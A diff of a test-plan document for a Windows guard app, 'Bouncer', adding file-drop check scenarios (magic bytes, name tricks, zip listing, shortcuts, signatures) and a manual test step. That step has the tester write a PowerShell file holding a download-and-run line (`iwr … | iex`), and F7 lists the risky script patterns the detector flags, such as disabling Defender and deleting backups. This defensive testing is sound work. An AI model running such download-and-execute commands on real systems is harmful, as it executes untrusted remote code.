@@ -251,6 +251,31 @@ command does and what could go wrong. It never decides.
 | UP7 | The release | The installer is built with no secrets; only the next step gets the updater key and runs only the pinned Tauri CLI's `signer sign` on it; latest.json (version, date, windows-x86_64 url + signature) is refused unless the signature's key ID is the configured public key's; the draft carries it; installer and CI builds never sign; v0.8.1's notes (the first release with these features; 0.8.0 never released) say 0.7.0 users install by hand once; a never-released tag (v0.8.0) is skipped by the notes | frontend (workflow checks) | `ts: updater: the key reaches only the step that signs the finished installer; the draft carries latest.json` `ts: updater: latest.json points at this release's installer with its signature` `ts: v0.8.1's notes: the first release with these features, 0.8.0 never released, 0.7.0 users install it by hand once` | CI |
 | UP8 | A real update | 0.8.0 installed, 0.8.1 published: the line shows within a day (or at start), Update installs passively and Bouncer comes back with hooks, rules, settings and history; offline: nothing shown | hand (after v0.8.1) | — | hand 2026-10-16 (Charan: 0.8.1 → 0.8.2; the line came after start, Update installed with no SmartScreen prompt, Installed apps shows 0.8.2, guard / settings / hooks unchanged; offline not checked); hand 2026-10-16 (Charan: 0.8.2 → 0.8.3 offered and installed) |
 
+## File drop (roadmap d)
+
+A file dropped on the island: Bouncer's own checks at once (no AI, nothing
+sent), then "Is this safe to run?" or "Ask about it" through the locked chat
+(C1–C16), only after Send on the exact text. Real clicks and real drags
+(a shell file drag, `CF_HDROP`, into the test instance behind the guard).
+
+| ID | Scenario | Expected | Proof | Test | Status |
+| --- | --- | --- | --- | --- | --- |
+| F1 | Drag a file over the island | A big "Drop to check it" target opens (easy to hit); several items say "One file at a time"; leaving puts the island back | frontend, real-click | `ts: drop: Bouncer's report never says safe and always says it can be wrong` | CI; real-click 2026-10-16 |
+| F2 | Drop one file | "Checking", then Bouncer's report: name, what it really is, size, findings (risky first), SHA-256, "Bouncer's own checks · can be wrong · you decide"; never "safe", never green | unit, frontend, real-click | `drop::tests::the_report_the_page_reads` `ts: drop: Bouncer's report never says safe and always says it can be wrong` `ts: drop: sizes read as the backend's` | CI; real-click 2026-10-16 |
+| F3 | Refused drops | A folder, several items, a link / junction (any reparse point), online-only, a network or device path, unreadable, empty: refused with a reason, nothing read | unit, real-click | `drop::tests::real_files_are_read_or_refused_with_a_reason` | CI; real-click 2026-10-16 (folder, several) |
+| F4 | A file being written; a file held | Another program writing it → "close it and try again"; while Bouncer holds it nobody can write, rename or delete it; every check uses that one handle | unit | `windows: drop::tests::a_file_being_written_is_refused_and_a_held_one_cant_be_written` | CI |
+| F5 | What it really is | Magic bytes, not the name: a program named `.pdf`, `.scr`, no ending; MSI / old Office, zip family, PDF, 7z / RAR / gzip / CAB / ISO ("can't look inside"), Linux and Mac programs | unit | `drop::tests::a_program_is_known_by_its_bytes_not_its_name` `drop::tests::office_macros_and_kinds` | CI |
+| F6 | Name tricks | Right-to-left override (real ending named), double endings (`.pdf.exe`), spaces before the ending, hidden characters, look-alike letters; the name shown with tags, cut, as text | unit, real-click | `drop::tests::name_tricks_are_flagged` | CI; real-click 2026-10-16 |
+| F7 | Scripts and text | Line by line: download-and-run, encoded commands, Defender off, start-on-its-own, attacker tools, policy off, hidden windows, backups deleted, whole-drive deletes, hidden characters, long encoded blocks; npm install scripts; VS Code tasks on open; UTF-16; risky only in files that run; paths in the text never resolved (no disk or network touch) | unit | `drop::tests::risky_script_lines_are_found_with_their_line_numbers` `drop::tests::the_same_words_in_a_plain_text_file_are_facts_not_risks` `drop::tests::script_text_never_makes_bouncer_touch_paths` `drop::tests::utf16_scripts_are_read` `drop::tests::install_scripts_and_tasks_that_run_on_open` `drop::tests::a_big_text_file_is_checked_from_its_start_and_says_so` | CI |
+| F8 | Zip archives | The central directory only, never unpacked: programs inside, zip slip, links, password-protected entries, macros, nested archives, a zip bomb (only numbers), zip64, a big zip read from its end, damaged lists say what was read | unit, real-click | `drop::tests::a_zip_is_listed_without_unpacking` `drop::tests::a_zip_bomb_is_only_numbers` `drop::tests::zip64_lists_are_read` `drop::tests::a_big_zip_is_read_from_its_end` `drop::tests::damaged_zips_say_what_was_read` | CI; real-click 2026-10-16 |
+| F9 | Shortcuts (`.lnk`) | Read from their own bytes, never followed: the target (environment block, link info, relative path) and arguments as text; a shell or script host as the target, padded arguments, a network target, the arguments' own risks; user names left out of paths | unit, real-click | `drop::tests::a_shortcut_says_what_it_runs_without_following_it` `drop::tests::user_names_never_leave_in_a_shortcut_target` | CI; real-click 2026-10-16 |
+| F10 | Hostile bytes | Random, truncated and corrupted zips and shortcuts, and random bytes under any name, never panic or hang | unit | `drop::tests::random_and_broken_zips_never_panic_or_hang` `drop::tests::random_and_broken_shortcuts_never_panic_or_hang` `drop::tests::random_bytes_never_panic_whatever_the_name` | CI |
+| F11 | Signature, origin, fingerprint | Windows' own check on the held handle, nothing fetched ("No signature in the file", "Signed by …", changed after signing); the Mark of the Web's zone and the site's host only; SHA-256 of the whole file (none over 256 MB, said so) | unit | `windows: drop::tests::windows_reads_the_signature` `drop::tests::the_download_site_is_named_by_its_host_only` `drop::tests::sha256_matches_the_standard_vectors` | CI |
+| F12 | "Is this safe to run?" | The preview is exactly what's sent (the file's name only, never its folder; facts and a text file's first 32 KB, secrets blanked, fenced as data; never a program's bytes); Send runs the locked chat with it on stdin; Cancel sends nothing; the answer box says "can be wrong · you decide"; Stop ends it; the file never reaches the chat folder | unit, frontend, real-click | `drop::tests::the_prompt_holds_the_name_never_the_folder_and_fences_the_file` `drop::tests::the_largest_prompt_still_fits_the_chat` `ts: drop: the answer streams for its own drop only, and stops in words` `ts: drop: a refused start says why; a file no longer held asks for the drop again` `chat::tests::explanation_events_carry_the_card_not_a_chat` | CI; real-click 2026-10-16 (fake claude) |
+| F13 | "Ask about it" | The chat panel shows the file and exactly what goes with the next message; it goes with that one message only; × removes it; a new drop, Close or the 10-minute hold drop it | frontend, real-click | `ts: drop: an attachment lasts only while its drop is the one shown` | CI; real-click 2026-10-16 (fake claude) |
+| F14 | The page's side | No path ever reaches the page's code or goes back: only the drop's ID (`drop_close`, `drop_preview`, `drop_ask`, `drop_stop`); the island never leaves its own page; the window is visible (parked off-screen) from the start so WebView2 takes drops | unit, frontend | `ts: drop: the page never reads or sends a path, and sends only the drop's ID` `tests::the_island_never_leaves_its_page` `tests::strict_csp_and_only_our_commands` | CI |
+| F15 | Cards come first | A permission card arriving over a report takes the island; once answered the report is back | real-click | (drop check) | real-click 2026-10-16 |
+
 ## macOS
 
 | ID | Scenario | Expected | Proof | Test | Status |
@@ -261,7 +286,7 @@ command does and what could go wrong. It never decides.
 
 ## Hand checks
 
-What a person has to do (about 13 minutes, plus the c3 and c2 checks). Use the dev app and the
+What a person has to do (about 13 minutes, plus the c3, c2 and file drop checks). Use the dev app and the
 playground (`../bouncer-playground`, its own `.claude/settings.local.json`);
 never the real `~/.claude/settings.json`.
 
@@ -374,6 +399,25 @@ never the real `~/.claude/settings.json`.
       Resume.
    Log it in `docs/PLAN.md` ("Manual checks", date + Claude Code
    version) and here.
+
+6. **A real file drop (about 6 min).** Dev app (its claude path
+   confirmed). Make a folder with `run.ps1` holding
+   `iwr https://example.com/x.ps1 | iex`, a copy of any `.exe` you trust,
+   and a `.zip` of a few files.
+   1. Drag `run.ps1` from Explorer onto the pill. Expected: a big "Drop to
+      check it" target opens as you reach the island; drop it: the report
+      says "Looks risky", line 1 downloads a script and runs it, and "can
+      be wrong · you decide".
+   2. Click **Is this safe to run?**. Expected: the exact text, with only
+      the file's name (no folder, no user name). **Cancel**: nothing runs
+      (Task Manager: no new `claude.exe`). Again, then **Send to Claude**:
+      an answer streams; it doesn't decide for you.
+   3. Drop the `.exe`: "Signed by …" or "No signature in the file", and its
+      SHA-256. Drop the `.zip`: what's inside, not unpacked.
+   4. Drop a folder, then two files at once: each refused in words.
+   5. **Ask about it** on any report, type a question, Enter. Expected: the
+      chat shows the file chip, then your question and the answer.
+   Log it in `docs/PLAN.md` ("Manual checks") and here.
 
 ### Phase 9 hand checks
 
